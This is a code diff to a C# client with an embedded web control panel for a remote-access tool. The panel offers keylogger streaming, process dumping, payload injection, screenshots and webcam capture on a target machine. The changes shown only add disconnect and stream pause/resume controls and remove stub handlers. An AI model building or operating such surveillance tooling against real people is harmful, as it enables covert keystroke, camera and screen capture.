@@ -166,10 +166,12 @@ namespace client
             <h3>>> UPLINK_CONFIG</h3>
             <input id='ip' value='127.0.0.1' placeholder='TARGET_IP'>
             <button onclick='connect()'>[ ESTABLISH UPLINK ]</button>
-
+            
             <h3 style='margin-top:20px'>>> EXPLOIT_TOOLS</h3>
             <button onclick=""send('LIST_APP')""> > DUMP PROCESSES</button>
             <button onclick=""send('KEYLOG')""> > KEYLOGGER STREAM</button>
+            <button onclick=""disconnectWS()"" class=""danger-btn"">[ DISCONNECT ]</button>
+
             <div style='margin-top:10px; border-top:1px dashed #333; padding-top:10px'>
                 <input id='appName' placeholder='payload.exe'>
                 <button onclick=""startApp()""> > INJECT / RUN</button>
@@ -184,6 +186,9 @@ namespace client
             <div style='display:flex; gap:5px; margin-top:5px'>
                 <button onclick=""send('SCREENSHOT')"">SNAP_SCREEN</button>
                 <button onclick=""send('WEBCAM')"">REC_CAM (10s)</button>
+
+                <button onclick=""stopStream()"" class=""danger-btn"">STOP STREAM</button>
+                <button onclick=""resumeStream()"" style=""border-color:#0a0; color:#0f0;"">RESUME</button>
             </div>
         </div>
 
@@ -209,6 +214,7 @@ namespace client
     </div>
 
     <script>
+        let streamEnabled = true;
         let ws;
         const term = document.getElementById('terminal');
 
@@ -224,6 +230,24 @@ namespace client
             </div>`;
             term.innerHTML += html;
             term.scrollTop = term.scrollHeight;
+        }
+        function stopStream() {
+            streamEnabled = false;
+            log(""Live stream stopped."", ""SYS"");
+        } 
+        function resumeStream() {
+            streamEnabled = true;
+            log(""Live stream resumed."", ""SYS"");
+        }
+        function disconnectWS() {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.close();
+                log(""Disconnected from server."", ""NET"");
+                document.getElementById(""status"").innerText = ""NO CARRIER"";
+                document.getElementById(""status"").style.color = ""#444"";
+            } else {
+                log(""No active connection to disconnect."", ""ERR"");
+            }
         }
 
         function connect() {
@@ -249,10 +273,16 @@ namespace client
                 
                 ws.onmessage = function(e) {
                     let d = e.data;
-                    if(d.startsWith('IMG|')) {
-                        document.getElementById('visual-feed').innerHTML = `<img src='data:image/jpeg;base64,${d.substring(4)}'>`;
-                        log('Image packet received (' + d.length + ' bytes).', 'DAT');
+                    if (d.startsWith(""LIVE|"")) {
+
+                        if (!streamEnabled) return; // ⭐ KHÔNG CẬP NHẬT NỮA ⭐
+
+                        let imgData = d.substring(5);
+                        document.getElementById('visual-feed').innerHTML =
+                            `<img src=""data:image/jpeg;base64,${imgData}"">`;
+                        return;
                     }
+
                     else if(d.startsWith('VID|')) {
                         document.getElementById('visual-feed').innerHTML = `<video controls autoplay loop src='data:video/avi;base64,${d.substring(4)}'></video>`;
                         log('Video stream buffer received.', 'DAT');
@@ -357,25 +387,6 @@ namespace client
             {
                 MessageBox.Show("Error launching interface: " + ex.Message);
             }
-        }
-
-        // --- CÁC HÀM "BỊT MIỆNG" LỖI DESIGNER (KHÔNG ĐƯỢC XÓA) ---
-        private void butApp_Click(object sender, EventArgs e) { }
-        private void butConnect_Click(object sender, EventArgs e) { }
-        private void button1_Click(object sender, EventArgs e) { }
-        private void butReg_Click(object sender, EventArgs e) { }
-        private void butKeyLock_Click(object sender, EventArgs e) { }
-        private void butPic_Click(object sender, EventArgs e) { }
-        private void butProcess_Click(object sender, EventArgs e) { }
-        private void butExit_Click(object sender, EventArgs e) { }
-        private void client_Closing(object sender, FormClosingEventArgs e) { }
-        private void txtIP_TextChanged(object sender, EventArgs e) { }
-        private void client_FormClosing(object sender, FormClosingEventArgs e) { }
-        private void client_Load(object sender, EventArgs e) { }
-
-        private void client_Load_1(object sender, EventArgs e)
-        {
-
         }
     }
 }
